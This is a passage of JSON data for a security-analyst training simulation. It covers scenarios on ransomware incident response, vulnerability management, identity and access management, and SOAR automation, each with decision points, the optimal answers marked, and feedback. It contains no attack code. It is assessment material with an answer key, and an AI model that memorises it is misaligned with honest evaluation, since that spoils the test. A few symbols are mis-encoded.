reports to all analysts daily", "is_optimal": false, "feedback": "{'short': 'Information overload without operationalization', 'detailed': \"Emailing reports doesn't operationalize intelligence. Analysts need intelligence integrated into their workflows - matched against alerts, available during investigation, informing detection rules. Reading reports doesn't scale; automation does.\"}"}, {"id": "D", "text": "Block all IOCs at the firewall automatically", "is_optimal": false, "feedback": "{'short': 'Blocking without analysis can cause problems', 'detailed': 'Automatic blocking without validation can block legitimate traffic (false positives in feeds) or alert adversaries (they notice blocks). Intelligence should inform detection and investigation first. Blocking is appropriate for high-confidence indicators after validation.'}"}]}, {"id": "decision_5", "title": "Detection Engineering Strategy", "situation": "Most of Trident's SIEM rules are vendor-provided defaults that haven't been customized. You notice there's heavy reliance on signature-based detection (known bad IPs, hashes) with few behavior-based detections.", "question": "How should detection engineering be approached to improve detection capabilities?", "options": [{"id": "A", "text": "Focus on adding more threat intelligence feeds for better signature coverage", "is_optimal": false, "feedback": "{'short': \"Signatures alone can't detect unknown threats\", 'detailed': \"More IOC feeds improve signature coverage but signatures only detect KNOWN threats. The cryptominer wasn't detected because it didn't match known signatures. Behavior-based detection catches threats regardless of specific indicators. Balance is needed.\"}"}, {"id": "B", "text": "Balance signature and behavior-based detection, map to MITRE ATT&CK for coverage", "is_optimal": true, "feedback": "{'short': 'Correct! Multiple detection types with coverage visibility', 'detailed': 'Effective detection engineering: signature-based for known threats (quick wins, low false positives), behavior-based for technique detection (catches unknown variants), and MITRE ATT&CK mapping to identify gaps. MITRE ATT&CK shows which adversary techniques you can detect and which are blind spots. This systematic approach ensures comprehensive coverage.'}"}, {"id": "C", "text": "Replace all rules with machine learning-based anomaly detection", "is_optimal": false, "feedback": "{'short': 'ML alone has high false positives and misses context', 'detailed': \"Pure anomaly detection generates many false positives - unusual doesn't always mean malicious. ML is valuable as one detection type but shouldn't replace rule-based detection. Layered approach: signatures, behaviors, AND anomaly detection each catch different threats.\"}"}, {"id": "D", "text": "Only create custom rules after specific incidents", "is_optimal": false, "feedback": "{'short': 'Reactive approach leaves gaps until exploitation', 'detailed': \"Waiting for incidents means threats succeed before detection exists. Proactive detection engineering uses threat intelligence and MITRE ATT&CK to build detections for likely attack techniques BEFORE they're used against you. Balance reactive (learn from incidents) with proactive (anticipate threats).\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D4-SIM-002", "domain": 4, "type": "SIM", "title": "Incident Response", "difficulty": "advanced", "role": "Security Analyst", "organization": {"name": "Axiom Pharmaceuticals"}, "introduction": "It's 6:47 AM and your phone is ringing. The SOC has detected ransomware actively encrypting servers in the research network. You're the Incident Response Lead, and this is the real thing. Drug research data worth billions is at risk, encryption is spreading, and the attacker claims to have stolen data. Every minute matters. Margaret Torres is en route and needs you to lead the technical response. What do you do?", "decision_points": [{"id": "decision_1", "title": "Immediate First Response", "situation": "It's 6:47 AM. Ransomware is actively encrypting research servers. You've just arrived and are getting briefed. Encryption is spreading to new servers every few minutes. What's your first action?", "question": "What should be your IMMEDIATE first action?", "options": [{"id": "A", "text": "Begin forensic imaging of affected systems", "is_optimal": false, "feedback": "{'short': 'Forensics is important but attack is still active', 'detailed': 'Forensic imaging is important for investigation but: the attack is still spreading, imaging takes hours per system, and more systems are being encrypted while you image. Stop the active attack first, then collect evidence. Containment before evidence collection when attack is active.'}"}, {"id": "B", "text": "Contain the attack - isolate the research network segment immediately", "is_optimal": true, "feedback": "{'short': 'Correct! Stop the active attack from spreading', 'detailed': 'With an active attack spreading every few minutes, containment is the first priority. Isolate the research network segment from the rest of the corporate network to stop lateral movement. This buys time for investigation and protects unaffected systems. Evidence can be collected after containment.'}"}, {"id": "C", "text": "Call emergency executive briefing", "is_optimal": false, "feedback": "{'short': \"Executives need to know, but containment can't wait\", 'detailed': \"Executive notification is important but not the FIRST action. While you're in a meeting, the attack spreads to more systems. Contain first, then notify. Delegate notification while you focus on technical response.\"}"}, {"id": "D", "text": "Shut down all servers to stop the encryption", "is_optimal": false, "feedback": "{'short': 'Stops encryption but destroys volatile evidence', 'detailed': 'Shutdown stops encryption but: loses volatile memory evidence (running malware, network connections), may corrupt partially encrypted files, and is harder to recover from than network isolation. Network isolation stops spread while preserving system state for analysis.'}"}]}, {"id": "decision_2", "title": "Containment Strategy", "situation": "You've isolated the research network. Now you need to determine full containment strategy. The attacker came in via VPN with stolen admin credentials. The compromised admin account is jsmith_admin.", "question": "What additional containment action is MOST critical?", "options": [{"id": "A", "text": "Disable VPN for all users until further notice", "is_optimal": false, "feedback": "{'short': 'Too broad - disrupts legitimate work unnecessarily', 'detailed': \"Disabling VPN entirely affects all remote workers and may not be necessary if the compromised credentials are addressed. More targeted containment: disable/reset the compromised account, implement emergency MFA requirement, block the source IPs. VPN shutdown may be needed but shouldn't be first action.\"}"}, {"id": "B", "text": "Disable and reset the compromised admin account immediately", "is_optimal": true, "feedback": "{'short': \"Correct! Remove the attacker's authenticated access\", 'detailed': \"The attacker is using jsmith_admin credentials. Immediately: disable the account (prevents new logins), reset the password (invalidates current sessions on most systems), and reset any service accounts this admin manages. This removes the attacker's primary means of access. Additional credential resets will follow, but this is the immediate priority.\"}"}, {"id": "C", "text": "Block the source IP address at the firewall", "is_optimal": false, "feedback": "{'short': 'Attacker can easily change IPs', 'detailed': 'The source IP was a Tor exit node - blocking it has minimal effect as the attacker can use different exit nodes or other infrastructure. Blocking the credential (disabling the account) is more effective than blocking the IP. IP blocking is secondary to credential action.'}"}, {"id": "D", "text": "Begin resetting all user passwords in Active Directory", "is_optimal": false, "feedback": "{'short': 'Mass reset causes chaos and may not be needed yet', 'detailed': 'Mass password reset disrupts all users and may not be necessary if only one account is compromised. Start with the known compromised account, then expand based on investigation findings. Mass reset may be needed later but is not the immediate priority.'}"}]}, {"id": "decision_3", "title": "Evidence Collection Priority", "situation": "The attack is contained. Now you need to collect evidence for investigation and potential legal proceedings. You have limited forensic resources. Systems are isolated but still running.", "question": "What evidence should be collected FIRST?", "options": [{"id": "A", "text": "Full disk images of all affected servers", "is_optimal": false, "feedback": "{'short': 'Disk imaging is important but not most time-sensitive', 'detailed': \"Disk contents are persistent - they won't disappear while you collect other evidence. Memory contents, running processes, and network connections are volatile and will be lost if systems are rebooted or crash. Collect volatile evidence first, then disk images.\"}"}, {"id": "B", "text": "Memory dumps and running process information from key systems", "is_optimal": true, "feedback": "{'short': 'Correct! Collect most volatile evidence first', 'detailed': 'Order of volatility: collect evidence that disappears fastest first. Memory contains: running malware code, decryption keys (possibly), network connections, attacker commands. This evidence is lost on reboot. Capture memory dumps from key affected systems first, then move to disk imaging. Memory analysis often reveals more than disk analysis for active incidents.'}"}, {"id": "C", "text": "Copies of the ransom notes", "is_optimal": false, "feedback": "{'short': 'Ransom notes are files on disk - not volatile', 'detailed': \"Ransom notes are important but they're just text files on disk - they'll be there when you get to disk imaging. Prioritize volatile evidence that won't survive a reboot.\"}"}, {"id": "D", "text": "Interview the compromised user immediately", "is_optimal": false, "feedback": "{'short': 'Important but technical evidence takes priority', 'detailed': \"User interview is valuable but: the user's memory won't disappear in the next hour, technical volatile evidence will. Collect volatile technical evidence first, interview can happen in parallel by another team member.\"}"}]}, {"id": "decision_4", "title": "Scope Determination", "situation": "Investigation reveals the attacker was in the network for 14 days before deploying ransomware. They exfiltrated approximately 200GB of data. The attack started with a phishing email to the compromised admin.", "question": "Based on this timeline, what is the KEY implication for the response?", "options": [{"id": "A", "text": "The phishing filter needs to be upgraded", "is_optimal": false, "feedback": "{'short': 'Improvement needed but not the key implication for current response', 'detailed': \"Phishing filter improvement is a valid lesson learned but doesn't affect the current response. The key implication is about the scope of compromise and required eradication actions based on the 14-day dwell time.\"}"}, {"id": "B", "text": "Data exfiltration means this is likely double extortion - paying ransom won't prevent data leak", "is_optimal": true, "feedback": "{'short': 'Correct! Exfiltration changes the calculus significantly', 'detailed': 'With 200GB exfiltrated, this is double extortion: pay for decryption AND pay to prevent data publication. Key implications: paying ransom may not prevent data leak (attackers often publish anyway), this affects breach notification decisions (data was accessed, not just encrypted), and incident severity increases significantly. This must inform executive decision-making and disclosure planning.'}"}, {"id": "C", "text": "14 days means complete credential reset is required", "is_optimal": false, "feedback": "{'short': 'True but not the KEY implication', 'detailed': 'Credential reset is needed due to the dwell time (attacker may have harvested many credentials). But the KEY implication is the data exfiltration - it changes the entire nature of the incident from encryption-only to data breach with potential regulatory and legal consequences.'}"}, {"id": "D", "text": "We need to identify every system accessed in 14 days", "is_optimal": false, "feedback": "{'short': 'Important for eradication but not the key implication', 'detailed': \"Identifying all accessed systems is necessary for eradication and scope determination. But the KEY implication is understanding that data exfiltration fundamentally changes the incident - it's now a data breach requiring notification, regardless of whether encryption is resolved.\"}"}]}, {"id": "decision_5", "title": "External Communication", "situation": "Margaret Torres asks who should be notified externally. The organization has cyber insurance, clinical trial data (HIPAA) is involved, the FBI has asked to be informed of ransomware incidents, and the board wants to know about media strategy.", "question": "Who should be contacted FIRST among external parties?", "options": [{"id": "A", "text": "FBI to report the ransomware attack", "is_optimal": false, "feedback": "{'short': 'Important but legal counsel should be engaged first', 'detailed': 'FBI notification is valuable - they may have intelligence on the attacker or decryption keys. However, legal counsel should be engaged first to establish attorney-client privilege over incident communications and advise on regulatory and legal implications. FBI can be contacted shortly after legal counsel engagement.'}"}, {"id": "B", "text": "Legal counsel (both internal and external breach counsel)", "is_optimal": true, "feedback": "{'short': 'Correct! Legal counsel establishes privilege and guides notifications', 'detailed': 'Legal counsel first because: attorney-client privilege protects sensitive incident communications, legal counsel advises on regulatory notification requirements (HIPAA timeline, state breach laws), counsel guides interaction with law enforcement, and counsel reviews all external communications. All other notifications flow more smoothly with legal guidance.'}"}, {"id": "C", "text": "Cyber insurance carrier to activate coverage", "is_optimal": false, "feedback": "{'short': 'Important but typically within 24-72 hours, not immediate', 'detailed': \"Insurance notification is required (usually within 24-72 hours per policy) but isn't the first call. Legal counsel helps understand policy requirements and may participate in insurance calls. Insurance often provides approved vendors for IR - but Axiom already has a response underway.\"}"}, {"id": "D", "text": "PR firm to manage media communications", "is_optimal": false, "feedback": "{'short': 'Premature - no external communications until legal reviews', 'detailed': \"Media communications may be needed eventually but: no public statement should be made without legal review, the incident is still being investigated (facts aren't yet clear), and premature disclosure can create legal exposure. PR comes after legal counsel establishes communication strategy.\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D4-SIM-003", "domain": 4, "type": "SIM", "title": "Vulnerability Management", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "Meridian Healthcare Systems"}, "introduction": "Meridian Healthcare Systems is drowning in vulnerabilities. With nearly 13,000 open findings and no clear prioritization, everything seems urgent and nothing gets fixed. A ransomware attack at a peer hospital - exploiting a vulnerability that had a patch available for months - has the board asking hard questions. HIPAA auditors cited your vulnerability management as deficient. Sarah Mitchell has brought you in to transform the program. You have executive support, but clinical operations cannot be disrupted. How do you build a program that actually reduces risk?", "decision_points": [{"id": "decision_1", "title": "Program Foundation", "situation": "With 12,847 open vulnerabilities and no clear process, you need to establish the foundation of a vulnerability management program. Everything seems urgent, and IT is overwhelmed.", "question": "What should be your FIRST priority in building the vulnerability management program?", "options": [{"id": "A", "text": "Immediately patch all critical vulnerabilities", "is_optimal": false, "feedback": "{'short': 'Tactical action without program foundation', 'detailed': \"Patching critical vulnerabilities is important, but without a program structure, you'll be in the same situation next month. You need sustainable processes: prioritization framework, ownership, SLAs, and tracking. Address the program gaps, not just the current backlog.\"}"}, {"id": "B", "text": "Complete asset inventory to understand what needs protection", "is_optimal": true, "feedback": "{'short': \"Correct! You can't protect what you don't know exists\", 'detailed': \"Asset inventory is foundational - you can't manage vulnerabilities on unknown assets. With only 70% scan coverage and unknown shadow IT, you have significant blind spots. Complete asset inventory enables: comprehensive scanning, accurate risk assessment, and accountability (every asset has an owner). Build the foundation first.\"}"}, {"id": "C", "text": "Implement a new vulnerability scanner", "is_optimal": false, "feedback": "{'short': \"Tool change doesn't fix process problems\", 'detailed': \"Tenable.io is a capable tool - the problem isn't the scanner, it's incomplete coverage and lack of process. A new tool will face the same challenges. Focus on process and coverage before considering tool changes.\"}"}, {"id": "D", "text": "Hire more staff to handle the remediation backlog", "is_optimal": false, "feedback": "{'short': \"Staffing without process won't solve the problem\", 'detailed': 'More staff without prioritization, SLAs, and accountability means more people working inefficiently. The problem is lack of program structure, not lack of hands. Establish the program, then right-size staffing.'}"}]}, {"id": "decision_2", "title": "Prioritization Approach", "situation": "With 234 critical vulnerabilities, you can't fix everything at once. IT wants to know what to work on first. Simply sorting by CVSS score has critical vulnerabilities on isolated test systems ranked the same as those on internet-facing production systems.", "question": "How should vulnerabilities be prioritized for remediation?", "options": [{"id": "A", "text": "Strictly by CVSS score - critical first, then high, etc.", "is_optimal": false, "feedback": "{'short': \"CVSS alone doesn't account for context\", 'detailed': 'CVSS measures vulnerability severity but not organizational risk. A critical vulnerability on an isolated test system is lower actual risk than a high vulnerability on an internet-facing system with PHI. Context matters - use risk-based prioritization that considers asset criticality and exposure.'}"}, {"id": "B", "text": "Risk-based: combine CVSS with asset criticality, exposure, and threat intelligence", "is_optimal": true, "feedback": "{'short': 'Correct! Risk-based prioritization considers organizational context', 'detailed': 'Risk-based prioritization: CVSS (severity) \u00c3\u2014 Asset Criticality (business importance) \u00c3\u2014 Exposure (internet-facing vs. isolated) \u00c3\u2014 Threat Intelligence (actively exploited?). This focuses remediation on vulnerabilities that pose the greatest actual risk to the organization. A medium vulnerability on an internet-facing PHI system may be higher priority than a critical on an isolated test box.'}"}, {"id": "C", "text": "By age - oldest vulnerabilities first", "is_optimal": false, "feedback": "{'short': \"Age doesn't indicate risk level\", 'detailed': \"Old vulnerabilities should be addressed, but age alone doesn't determine risk. A 6-month-old low vulnerability on a test system is lower priority than a 1-week-old critical on production. Use risk, not age, for prioritization. Track aging separately.\"}"}, {"id": "D", "text": "Let each system owner decide their own priorities", "is_optimal": false, "feedback": "{'short': 'No consistency, no organizational risk view', 'detailed': 'System owners prioritize their own workload, not organizational risk. One owner might ignore critical vulnerabilities while another over-invests in low vulnerabilities. Security needs organizational risk view to set priorities across teams.'}"}]}, {"id": "decision_3", "title": "Remediation SLAs", "situation": "You need to establish SLAs for vulnerability remediation. The HIPAA auditors noted lack of defined remediation timeframes. IT pushes back that 'we'll get to it when we can.'", "question": "What is the MOST appropriate SLA for critical vulnerabilities on internet-facing systems?", "options": [{"id": "A", "text": "24-72 hours", "is_optimal": true, "feedback": "{'short': 'Correct! Highest risk requires fastest response', 'detailed': 'Critical vulnerabilities on internet-facing systems are highest risk - directly attackable from the internet. 24-72 hours is appropriate: urgent but allows for change management and testing. Actively exploited vulnerabilities may require emergency patching within 24 hours. This aligns with industry standards and CISA KEV requirements.'}"}, {"id": "B", "text": "7 days", "is_optimal": false, "feedback": "{'short': 'Too long for internet-facing critical vulnerabilities', 'detailed': '7 days may be appropriate for critical internal vulnerabilities, but internet-facing systems face immediate attack risk. Attackers often exploit new vulnerabilities within days of disclosure. 24-72 hours is more appropriate for internet-exposed critical issues.'}"}, {"id": "C", "text": "30 days", "is_optimal": false, "feedback": "{'short': 'Far too long for this risk level', 'detailed': '30 days is appropriate for high-severity vulnerabilities, not critical internet-facing. A month of exposure for a critical internet-facing vulnerability is unacceptable risk. Attackers actively scan for and exploit such vulnerabilities.'}"}, {"id": "D", "text": "Next scheduled maintenance window", "is_optimal": false, "feedback": "{'short': 'Not risk-appropriate for critical vulnerabilities', 'detailed': 'Waiting for scheduled maintenance may mean weeks or months of exposure. Critical internet-facing vulnerabilities may require emergency maintenance windows. SLAs should drive action, not wait for convenient timing.'}"}]}, {"id": "decision_4", "title": "Medical Device Vulnerabilities", "situation": "The radiology system has a critical remote code execution vulnerability. The vendor says no patch is available and won't be for 6 months. The system is essential for patient care and cannot be taken offline.", "question": "What is the BEST approach for this unpatchable medical device vulnerability?", "options": [{"id": "A", "text": "Accept the risk - clinical operations must continue", "is_optimal": false, "feedback": "{'short': 'Risk acceptance without mitigation is negligent', 'detailed': \"Simply accepting risk without compensating controls exposes the organization and patients. 'We can't patch' doesn't mean 'we can't protect.' Compensating controls can significantly reduce risk while waiting for vendor patch.\"}"}, {"id": "B", "text": "Implement compensating controls: network segmentation, monitoring, access restrictions", "is_optimal": true, "feedback": "{'short': \"Correct! Compensating controls reduce risk when patching isn't possible\", 'detailed': \"When patching isn't possible, compensating controls reduce risk: network segmentation (isolate device, restrict access to only necessary systems), enhanced monitoring (detect exploitation attempts), strict access control (limit who can reach the device), and vendor pressure (document the gap, push for patch). Document controls and residual risk acceptance.\"}"}, {"id": "C", "text": "Take the system offline until vendor provides patch", "is_optimal": false, "feedback": "{'short': 'Impacts patient care - not a viable option', 'detailed': 'Taking essential clinical equipment offline impacts patient care, which is unacceptable. Security exists to enable safe operations, not to shut down healthcare. Compensating controls allow continued operation with reduced risk.'}"}, {"id": "D", "text": "Switch to a different vendor's system immediately", "is_optimal": false, "feedback": "{'short': 'Not practical for complex medical systems', 'detailed': 'Medical device changes are complex: procurement, implementation, training, workflow changes, and FDA considerations. This is a long-term strategic decision, not an immediate response. Implement compensating controls now, consider vendor changes in procurement cycle.'}"}]}, {"id": "decision_5", "title": "Vulnerability on PHI System", "situation": "A high-severity vulnerability is discovered on a system that stores PHI. The system is internal-only (not internet-facing) and has network segmentation. IT wants to wait for the next maintenance window (3 weeks away).", "question": "How should this vulnerability be handled?", "options": [{"id": "A", "text": "Follow standard high-severity SLA (30 days) - it's internal only", "is_optimal": false, "feedback": "{'short': 'PHI data sensitivity elevates priority', 'detailed': \"Standard SLA doesn't account for data sensitivity. PHI breach has significant regulatory (HIPAA), legal, and reputational consequences. PHI systems warrant elevated priority regardless of network location. Apply the PHI overlay to asset criticality.\"}"}, {"id": "B", "text": "Elevate priority due to PHI - remediate within 7-14 days with interim controls", "is_optimal": true, "feedback": "{'short': 'Correct! PHI sensitivity elevates priority; interim controls provide protection', 'detailed': 'PHI data sensitivity elevates the effective criticality. The 3-week wait is too long for a PHI system with a high vulnerability. Approach: implement interim compensating controls now (enhanced monitoring, access review), escalate for earlier maintenance window, remediate within 7-14 days. Document the elevated handling for compliance.'}"}, {"id": "C", "text": "Emergency patch tonight - PHI risk is unacceptable", "is_optimal": false, "feedback": "{'short': 'May be overkill given network segmentation and internal-only status', 'detailed': 'Emergency patching for an internal, segmented system may be excessive and disruptive. The risk is elevated due to PHI, but compensating controls (segmentation, internal-only) provide some protection. Expedited remediation (7-14 days) with interim controls is appropriate; emergency action (24-72 hours) may be unnecessary.'}"}, {"id": "D", "text": "Wait for the maintenance window - segmentation mitigates the risk", "is_optimal": false, "feedback": "{'short': \"Segmentation helps but doesn't eliminate PHI risk\", 'detailed': \"Segmentation reduces attack surface but doesn't eliminate the vulnerability. An attacker who gains internal access (phishing, compromised endpoint) can still exploit it. 3 weeks is too long for a high vulnerability on a PHI system. Escalate for earlier remediation.\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D4-SIM-004", "domain": 4, "type": "SIM", "title": "Identity and Access Management", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "Northwind Dynamics"}, "introduction": "Northwind Dynamics' identity management is a patchwork of manual processes, shared credentials, and good intentions. A terminated employee walking out with customer data was the wake-up call, but the shared admin credentials that enabled a ransomware attack got the board's attention. SOX auditors are citing access control deficiencies, and your largest customer is threatening to pull their contract without security improvements. Robert Walsh has brought you in to architect a modern IAM program. Where do you start?", "decision_points": [{"id": "decision_1", "title": "Addressing Deprovisioning Gap", "situation": "The terminated employee incident has everyone's attention. Currently, deprovisioning takes weeks because it's a manual email from HR to IT. There's no SLA and no tracking.", "question": "What is the MOST critical improvement to prevent terminated user access?", "options": [{"id": "A", "text": "Create a policy requiring HR to notify IT immediately upon termination", "is_optimal": false, "feedback": "{'short': 'Policy without automation will still have gaps', 'detailed': 'Policy is necessary but insufficient. Manual notification is error-prone - HR may forget, email may be missed, IT may have backlog. The terminated employee incident happened despite having a notification process. Automation is required for reliable, immediate deprovisioning.'}"}, {"id": "B", "text": "Automated deprovisioning triggered by HR system termination record", "is_optimal": true, "feedback": "{'short': 'Correct! Automated deprovisioning eliminates human error', 'detailed': 'Automated deprovisioning: HR marks employee as terminated \u00e2\u2020\u2019 Identity system automatically disables accounts across all connected systems within minutes. No manual steps, no delays, no forgotten notifications. HR system becomes the authoritative source. This is the most reliable way to ensure terminated users lose access immediately.'}"}, {"id": "C", "text": "Daily audit of terminated employees against active accounts", "is_optimal": false, "feedback": "{'short': \"Detective control - catches gaps but doesn't prevent them\", 'detailed': \"Daily reconciliation is a good detective control to catch failures, but: it still allows up to 24 hours of access after termination, requires manual remediation, and doesn't scale well. Better as a backup to automated deprovisioning, not the primary control.\"}"}, {"id": "D", "text": "Require managers to report terminations to IT directly", "is_optimal": false, "feedback": "{'short': 'More manual steps = more failure points', 'detailed': \"Adding manager notification creates another manual step that can fail. Managers aren't always available, may forget, or may not know all systems to report. Automation from authoritative HR system is more reliable than adding more human steps.\"}"}]}, {"id": "decision_2", "title": "MFA Deployment Priority", "situation": "The cyber insurance carrier requires MFA deployment. Currently only VPN has MFA (RSA tokens). You need to expand coverage but can't do everything at once. Cloud applications, email, and admin access are all unprotected.", "question": "What should be the FIRST priority for MFA expansion?", "options": [{"id": "A", "text": "All cloud applications - most exposed to internet", "is_optimal": false, "feedback": "{'short': 'Cloud is important but privileged access is highest risk', 'detailed': \"Cloud applications face internet exposure, but compromised admin credentials caused the ransomware incident - that's the demonstrated highest risk. Admin accounts can access everything; regular user accounts have limited blast radius. Protect the keys to the kingdom first.\"}"}, {"id": "B", "text": "All privileged and administrative access", "is_optimal": true, "feedback": "{'short': 'Correct! Protect the accounts with greatest potential damage', 'detailed': 'Privileged access first: admin accounts can deploy ransomware, access all data, and cause catastrophic damage. The ransomware incident was enabled by compromised shared admin credentials. MFA on admin access: prevents credential stuffing/phishing from gaining admin, highest impact per account protected, and addresses the demonstrated risk.'}"}, {"id": "C", "text": "All employees for email access", "is_optimal": false, "feedback": "{'short': 'Broad coverage but lower risk per account', 'detailed': 'Email MFA protects against business email compromise, which is valuable. But: every employee needs email (complex deployment), individual compromise is bad but limited impact vs. admin compromise. Deploy to admins first for highest risk reduction.'}"}, {"id": "D", "text": "Manufacturing floor systems - core business", "is_optimal": false, "feedback": "{'short': 'Manufacturing systems often have MFA challenges', 'detailed': 'Manufacturing floor systems may not support standard MFA, and users often work in environments where MFA is difficult (gloves, shared stations). These need different approaches. Address admin access first, then address manufacturing with appropriate controls.'}"}]}, {"id": "decision_3", "title": "Privileged Access Model", "situation": "The shared admin credentials issue is critical. Currently, 15 people share 3 admin accounts, passwords are in a spreadsheet, and there's no logging of who did what. You need to implement proper privileged access management.", "question": "What is the MOST important PAM capability to implement first?", "options": [{"id": "A", "text": "Session recording for all privileged access", "is_optimal": false, "feedback": "{'short': \"Valuable for forensics but doesn't prevent shared credentials\", 'detailed': \"Session recording provides audit trail and forensics, but: it doesn't prevent shared credentials, doesn't enable accountability (who logged in as shared admin?), and doesn't reduce standing privilege. Address credential management first.\"}"}, {"id": "B", "text": "Individual admin accounts with credential vaulting (no shared passwords)", "is_optimal": true, "feedback": "{'short': 'Correct! Eliminate shared credentials and establish accountability', 'detailed': \"First priority: eliminate shared credentials. Each admin gets individual account, credentials stored in vault (not spreadsheet), check-out/check-in with audit trail, and automatic password rotation. This enables: accountability (who did what), incident investigation, and credential protection. You can't secure what you share.\"}"}, {"id": "C", "text": "Just-in-time privilege elevation", "is_optimal": false, "feedback": "{'short': 'Advanced capability - build on credential management foundation', 'detailed': 'JIT access is powerful but requires foundation: first implement individual accounts and vaulting, then layer JIT on top. Implementing JIT with shared credentials still has shared credential problem. Walk before you run.'}"}, {"id": "D", "text": "Privileged access workstations", "is_optimal": false, "feedback": "{'short': \"Valuable but doesn't address shared credential problem\", 'detailed': \"PAWs provide secure admin environment, but: if admins still share credentials, PAWs don't solve accountability. Address credential management first, then consider PAWs for high-security environments.\"}"}]}, {"id": "decision_4", "title": "Access Review Implementation", "situation": "SOX auditors cited lack of access reviews. Access has accumulated over years - users have permissions from three jobs ago. You need to implement access reviews but face resistance: 'We're too busy to review all this.'", "question": "How should access reviews be implemented to be both effective and manageable?", "options": [{"id": "A", "text": "Comprehensive annual review of all access for all users", "is_optimal": false, "feedback": "{'short': 'Too much at once leads to rubber-stamping', 'detailed': 'Annual comprehensive reviews overwhelm reviewers with thousands of access decisions at once. Result: rubber-stamping (approve everything to get it done). Instead, distribute reviews throughout the year and focus on what matters most.'}"}, {"id": "B", "text": "Risk-based approach: quarterly for privileged access, annually for standard, focus on changes", "is_optimal": true, "feedback": "{'short': \"Correct! Prioritize by risk, focus on what's changed\", 'detailed': 'Risk-based review approach: privileged access reviewed quarterly (highest risk), standard access reviewed annually, and focus reviews on changes (new access, job changes) rather than re-certifying unchanged access. This is manageable (reviewers see less), effective (catches drift), and compliant (documented risk-based approach).'}"}, {"id": "C", "text": "Automated review that revokes access not used in 90 days", "is_optimal": false, "feedback": "{'short': 'May revoke needed but infrequently used access', 'detailed': \"Usage-based revocation sounds good but: some access is needed infrequently (quarterly reports, annual processes), automatic revocation can disrupt business, and some sensitive access is 'just in case' (emergency procedures). Use usage data to inform reviews, not replace them.\"}"}, {"id": "D", "text": "Self-certification - users review and certify their own access", "is_optimal": false, "feedback": "{'short': 'Users will certify everything they have', 'detailed': 'Users have incentive to keep all access - they certified their own access, which is no control at all. Reviews must be done by someone with authority and incentive to revoke (manager, application owner). Self-certification fails basic separation of duties.'}"}]}, {"id": "decision_5", "title": "Role-Based Access Control", "situation": "Access is currently granted individually - each application, each permission, each user. This creates thousands of individual permissions to manage. You want to implement role-based access control (RBAC).", "question": "What is the BEST approach to implementing RBAC?", "options": [{"id": "A", "text": "Create a role for every unique combination of access in the organization", "is_optimal": false, "feedback": "{'short': 'Role explosion - defeats the purpose of RBAC', 'detailed': \"Creating too many roles (role explosion) eliminates the benefits of RBAC. If you have nearly as many roles as people, you're just renaming individual access. Roles should be based on job functions, not existing access patterns. Start with common roles that cover most users.\"}"}, {"id": "B", "text": "Start with common functional roles (HR, Finance, Engineering), refine over time", "is_optimal": true, "feedback": "{'short': 'Correct! Start simple, expand based on need', 'detailed': 'RBAC implementation: start with clearly defined functional roles that cover the majority of the workforce, accept that some individual exceptions will exist initially, and refine roles based on access request patterns. Better to have 50 well-defined roles covering 80% of users than 500 roles covering 100%. The goal is simplification, not perfection.'}"}, {"id": "C", "text": "Analyze all existing access and build roles from access patterns", "is_optimal": false, "feedback": "{'short': 'Risk of codifying existing problems into roles', 'detailed': \"Bottom-up role mining from existing access: may codify excessive access into roles, reflects how access drifted rather than how it should be, and is complex analysis. Use job functions (top-down) as primary approach, with access analysis to validate. Don't build roles from accumulated access problems.\"}"}, {"id": "D", "text": "Require application teams to define all possible roles for their applications", "is_optimal": false, "feedback": "{'short': \"Application-centric roles don't align to job functions\", 'detailed': \"Application-centric roles: each application has its own roles, doesn't align to organizational job functions, and user might need roles in 20 different applications. Organizational roles should map to application permissions, not the other way around. Central identity team defines organizational roles.\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D4-SIM-005", "domain": 4, "type": "SIM", "title": "Security Automation and Orchestration", "difficulty": "advanced", "role": "Security Analyst", "organization": {"name": "Sentinel Insurance Group"}, "introduction": "Sentinel Insurance Group's SOC is drowning in manual work. Every alert requires the same repetitive steps: lookup the user, check the asset, query threat intel, create a ticket, document findings. Analysts are burning out on copy-paste workflows while real threats wait in queue. James Park has secured budget for a SOAR platform and brought you in to architect the automation program. The tools are ready - now you need to decide what to automate, how to automate it safely, and how to measure success. Where do you start?", "decision_points": [{"id": "decision_1", "title": "Automation Starting Point", "situation": "You have a SOAR platform and dozens of potential use cases. Analysts want help with everything, but you need to prioritize. Some want automated containment immediately; others want basic enrichment first.", "question": "What should be the FIRST automation use case to implement?", "options": [{"id": "A", "text": "Automated endpoint isolation for malware alerts", "is_optimal": false, "feedback": "{'short': 'High-risk action too early - need to build trust first', 'detailed': \"Automated containment is valuable but risky to start with. If automation makes a mistake isolating a critical system, you'll lose organizational trust. Start with lower-risk automation to prove value and accuracy before moving to containment actions.\"}"}, {"id": "B", "text": "Alert enrichment - automatically add context to all alerts", "is_optimal": true, "feedback": "{'short': 'Correct! Low-risk, high-value, builds foundation', 'detailed': 'Alert enrichment is ideal first use case: low risk (read-only, no actions taken), high value (saves 35% of analyst time), high visibility (every analyst benefits immediately), and foundation for future automation (enrichment data feeds into decision-making). Prove value with enrichment, then expand to actions.'}"}, {"id": "C", "text": "Full phishing response automation including containment", "is_optimal": false, "feedback": "{'short': 'Too complex for first playbook', 'detailed': 'Full phishing automation involves multiple integrations (email, proxy, threat intel), containment actions, and many edge cases. Better to start simpler, prove the platform works, then tackle complex workflows. Phishing is a great second or third playbook.'}"}, {"id": "D", "text": "Automated ticket creation for all alerts", "is_optimal": false, "feedback": "{'short': 'Valuable but less impactful than enrichment', 'detailed': 'Ticket creation saves time (25% of analyst work) but creates less analyst value than enrichment. An auto-created ticket without context still requires manual lookups. Enrichment + ticket creation together is powerful, but enrichment alone provides more value.'}"}]}, {"id": "decision_2", "title": "Containment Automation Risk", "situation": "After successful enrichment automation, leadership wants to automate containment - blocking IPs, isolating hosts, disabling accounts. Some analysts are nervous about automated actions causing outages.", "question": "How should containment automation be approached?", "options": [{"id": "A", "text": "Fully automate all containment - speed is critical in incident response", "is_optimal": false, "feedback": "{'short': 'Too risky - automation errors can cause major disruption', 'detailed': 'Full automation for containment risks isolating critical systems based on false positives, blocking legitimate services, or taking actions during sensitive business hours. Speed is important but not at the cost of reliability. Graduated approach is safer.'}"}, {"id": "B", "text": "Risk-based approach: auto-execute low-risk actions, require approval for high-risk", "is_optimal": true, "feedback": "{'short': 